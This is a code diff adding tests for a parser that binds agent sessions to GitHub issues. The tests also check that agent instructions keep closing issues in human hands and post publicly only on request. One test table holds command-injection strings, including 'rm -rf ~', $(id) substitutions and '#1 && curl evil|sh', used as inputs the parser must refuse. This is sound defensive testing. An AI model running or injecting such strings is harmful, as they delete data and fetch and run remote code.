@@ -1006,3 +1006,72 @@ describe('trigger wording does not claim in-process subagent requests (issue #91
     expect(skill).toMatch(/independent workstreams step 0 identified/)
   })
 })
+
+describe('--issue: GitHub issue-bound sessions', () => {
+  it('accepts owner/repo#N and #N on the two agent-open verbs', () => {
+    expect(parseControlRequest('open-agent', { agent: 'claude', issue: 'eneskirca/nodeterm#42' })).toEqual({
+      verb: 'open-agent',
+      args: { agent: 'claude', issue: 'eneskirca/nodeterm#42' }
+    })
+    expect(parseControlRequest('open-claude', { issue: '#7' })).toMatchObject({ verb: 'open-claude' })
+  })
+
+  it.each([
+    'o/r#1; rm -rf ~',
+    'o/r#`id`',
+    'o/r#$(id)',
+    '$(id)/r#1',
+    'o/r#1\nrm -rf ~',
+    '#1 && curl evil|sh',
+    'o/r',
+    ''
+  ])('refuses a hostile or malformed reference %j before any shell sees it', (issue) => {
+    const r = parseControlRequest('open-agent', { agent: 'claude', issue })
+    expect(r).toHaveProperty('error')
+    expect((r as { error: string }).error).toMatch(/^open-agent: --issue must be/)
+  })
+
+  it('refuses --issue on a verb that cannot read an issue, rather than silently ignoring it', () => {
+    expect(parseControlRequest('open-terminal', { issue: '#1' })).toEqual({
+      error: 'open-terminal: --issue applies only to open-agent / open-claude (an agent session reads the issue itself)'
+    })
+    expect(parseControlRequest('assign', { node: 'n1', issue: '#1' })).toHaveProperty('error')
+  })
+
+  // The skill and the marker block are what an agent actually reads. Walk BOTH, and red on any
+  // clause of the contract that goes missing — a doc line with no test is a plan, not a fact.
+  const bodies: Array<[string, string]> = [
+    ['skill body', buildCanvasSkillBody('/x/nodeterm.sh')],
+    ['instructions block', buildCanvasControlInstructions('/x/nodeterm.sh')]
+  ]
+
+  it.each(bodies)('%s documents the flag on both open verbs', (_name, body) => {
+    expect(body).toMatch(/open-claude [^\n]*\[--issue <owner\/repo#N \| #N>\]/)
+    expect(body).toMatch(/open-agent --agent [^\n]*\[--issue <owner\/repo#N \| #N>\]/)
+  })
+
+  it.each(bodies)('%s states the reference-only launch prompt, rendered from the real composer', (_name, body) => {
+    expect(body).toContain('carries ONLY the reference, never the issue\'s')
+    expect(body).toContain('You are working on GitHub issue owner/repo#123.')
+    expect(body).toContain('gh issue view 123 --repo owner/repo --comments')
+    expect(body).toMatch(/with no repository configured it is\s+refused/)
+  })
+
+  it.each(bodies)('%s pins the status + write-back contract', (_name, body) => {
+    const flat = body.replace(/\s+/g, ' ')
+    expect(flat).toContain('assign --node "$NODETERM_NODE_ID" --column "In Progress"')
+    expect(flat).toContain('--column "In Review"')
+    expect(flat).toContain('never Done')
+    expect(flat).toContain('Never close the GitHub issue and never move a card to Done: done stays human.')
+    expect(flat).toContain('Closes #N')
+    expect(flat).toContain('Posting to GitHub is outward-facing and PUBLIC.')
+    expect(flat).toContain('ONLY when the user asked for it in this session')
+    expect(flat).toContain('otherwise end with a proposed comment the user can post')
+    expect(flat).toContain('The end of a turn moves nothing')
+  })
+
+  it.each(bodies)('%s never promises an automatic post to GitHub', (_name, body) => {
+    expect(body).not.toMatch(/automatically (post|comment|close)/i)
+    expect(body).not.toMatch(/nodeterm (posts|comments|closes)/i)
+  })
+})
